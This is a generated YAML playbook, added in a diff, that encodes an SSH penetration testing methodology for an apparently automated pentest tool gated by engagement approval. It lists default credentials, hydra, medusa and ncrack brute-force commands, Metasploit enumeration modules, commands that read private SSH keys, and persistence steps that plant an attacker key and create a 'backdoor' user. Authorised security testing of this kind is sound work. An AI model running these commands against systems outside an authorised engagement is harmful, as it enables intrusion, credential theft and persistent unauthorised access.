@@ -1,0 +1,223 @@
+# GENERATED from ssh_methodology.md by scripts/playbooks_to_yaml.py — do not hand-edit.
+#
+# The markdown stays authoritative: it is what a human reads and what RAG
+# ingests. This is an EXTRACT of the steps in it, so that something other
+# than a language model can act on them. Re-generate after editing the
+# markdown; tests/test_playbooks.py fails if the two drift.
+#
+# access_required is a conservative heuristic, recorded so a consumer can
+# FILTER — never so anything can decide to run. Authorisation stays with
+# the scope gate and the engagement's approval.
+name: ssh_methodology
+title: SSH Penetration Testing Methodology
+source: ssh_methodology.md
+generated_by: scripts/playbooks_to_yaml.py
+phases:
+- id: initial-reconnaissance
+  name: Initial Reconnaissance
+  steps:
+  - id: initial-reconnaissance.version-detection
+    title: Version Detection
+    access_required: none
+    mutates: false
+    source_line: 8
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p22 {target}
+    checks:
+    - SSH version (OpenSSH, Dropbear, etc.)
+    - Protocol version (SSH-2.0 preferred, SSH-1.0 is vulnerable)
+    - Operating system hints from banner
+  - id: initial-reconnaissance.algorithm-audit
+    title: Algorithm Audit
+    access_required: none
+    mutates: false
+    source_line: 17
+    commands:
+    - lang: bash
+      command: ssh-audit {target}
+    checks:
+    - Weak key exchange algorithms (diffie-hellman-group1-sha1)
+    - Weak ciphers (arcfour, 3des-cbc, blowfish-cbc)
+    - Weak MACs (hmac-md5, hmac-sha1-96)
+    - Weak host key types (ssh-dss)
+- id: credential-attacks
+  name: Credential Attacks
+  steps:
+  - id: credential-attacks.default-credentials
+    title: Default Credentials
+    access_required: none
+    mutates: false
+    source_line: 29
+    checks:
+    - root:root
+    - root:toor
+    - admin:admin
+    - admin:password
+    - user:user
+    - ubuntu:ubuntu
+    - pi:raspberry
+  - id: credential-attacks.brute-force
+    title: Brute Force
+    access_required: credential
+    mutates: false
+    source_line: 39
+    commands:
+    - lang: bash
+      command: hydra -L users.txt -P passwords.txt ssh://{target} -t 4
+    - lang: bash
+      command: medusa -h {target} -U users.txt -P passwords.txt -M ssh -t 4
+    - lang: bash
+      command: ncrack -p22 --user root -P passwords.txt {target}
+  - id: credential-attacks.known-credentials
+    title: Known Credentials
+    access_required: none
+    mutates: false
+    source_line: 51
+    checks:
+    - Check password reuse
+    - Try variations of found passwords
+    - Try username as password
+- id: user-enumeration
+  name: User Enumeration
+  steps:
+  - id: user-enumeration.cve-2018-15473-openssh-7-7
+    title: CVE-2018-15473 (OpenSSH < 7.7)
+    access_required: none
+    mutates: false
+    source_line: 59
+    commands:
+    - lang: bash
+      command: msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS {target}; set USER_FILE
+        users.txt; run"
+    - lang: bash
+      command: python3 ssh-enum.py {target} -w users.txt
+- id: exploitation
+  name: Exploitation
+  steps:
+  - id: exploitation.common-vulnerabilities
+    title: Common Vulnerabilities
+    access_required: none
+    mutates: false
+    source_line: 70
+  - id: exploitation.cve-2018-15473-openssh-user-enumeration-7-7
+    title: CVE-2018-15473** - OpenSSH User Enumeration (< 7.7)
+    access_required: none
+    mutates: false
+    source_line: 72
+    checks:
+    - Allows username enumeration via timing attack
+    - 'Metasploit: `auxiliary/scanner/ssh/ssh_enumusers`'
+  - id: exploitation.cve-2016-0777-0778-openssh-roaming-bug
+    title: CVE-2016-0777/0778** - OpenSSH Roaming Bug
+    access_required: none
+    mutates: false
+    source_line: 76
+    checks:
+    - Affects OpenSSH 5.4 - 7.1p1
+    - Client-side vulnerability, memory disclosure
+  - id: exploitation.cve-2008-0166-debian-openssl-weak-keys
+    title: CVE-2008-0166** - Debian OpenSSL Weak Keys
+    access_required: none
+    mutates: false
+    source_line: 80
+    checks:
+    - Debian/Ubuntu systems from 2006-2008
+    - Predictable key generation
+  - id: exploitation.metasploit-modules
+    title: Metasploit Modules
+    access_required: none
+    mutates: false
+    source_line: 84
+    commands:
+    - lang: bash
+      command: use auxiliary/scanner/ssh/ssh_version
+    - lang: bash
+      command: use auxiliary/scanner/ssh/ssh_login
+    - lang: bash
+      command: set RHOSTS {target}
+    - lang: bash
+      command: set USER_FILE users.txt
+    - lang: bash
+      command: set PASS_FILE passwords.txt
+    - lang: bash
+      command: run
+    - lang: bash
+      command: use auxiliary/scanner/ssh/ssh_enumusers
+    - lang: bash
+      command: set RHOSTS {target}
+    - lang: bash
+      command: set USER_FILE users.txt
+    - lang: bash
+      command: run
+    - lang: bash
+      command: use auxiliary/scanner/ssh/ssh_login_pubkey
+- id: post-exploitation
+  name: Post-Exploitation
+  steps:
+  - id: post-exploitation.if-access-gained
+    title: If Access Gained
+    access_required: shell
+    mutates: false
+    source_line: 108
+  - id: post-exploitation.enumerate-sudo-rights
+    title: Enumerate sudo rights
+    access_required: shell
+    mutates: false
+    source_line: 110
+    commands:
+    - lang: bash
+      command: sudo -l
+  - id: post-exploitation.check-ssh-keys
+    title: Check SSH keys
+    access_required: shell
+    mutates: false
+    source_line: 115
+    commands:
+    - lang: bash
+      command: cat ~/.ssh/authorized_keys
+    - lang: bash
+      command: cat ~/.ssh/id_rsa
+    - lang: bash
+      command: cat ~/.ssh/known_hosts
+  - id: post-exploitation.examine-ssh-config
+    title: Examine SSH config
+    access_required: shell
+    mutates: false
+    source_line: 122
+    commands:
+    - lang: bash
+      command: cat /etc/ssh/sshd_config
+    checks:
+    - PermitRootLogin
+    - PasswordAuthentication
+    - AuthorizedKeysFile
+  - id: post-exploitation.check-for-key-reuse
+    title: Check for key reuse
+    access_required: shell
+    mutates: false
+    source_line: 131
+    checks:
+    - Copy discovered private keys
+    - Try keys on other hosts
+- id: persistence
+  name: Persistence
+  steps:
+  - id: persistence.add-ssh-key
+    title: Add SSH Key
+    access_required: shell
+    mutates: true
+    source_line: 137
+    commands:
+    - lang: bash
+      command: echo "ssh-rsa AAAA... attacker@host" >> ~/.ssh/authorized_keys
+  - id: persistence.backdoor-ssh-requires-root
+    title: Backdoor SSH (requires root)
+    access_required: shell
+    mutates: true
+    source_line: 142
+    commands:
+    - lang: bash
+      command: useradd -m -s /bin/bash backdoor
+    - lang: bash
+      command: echo "backdoor:password" | chpasswd
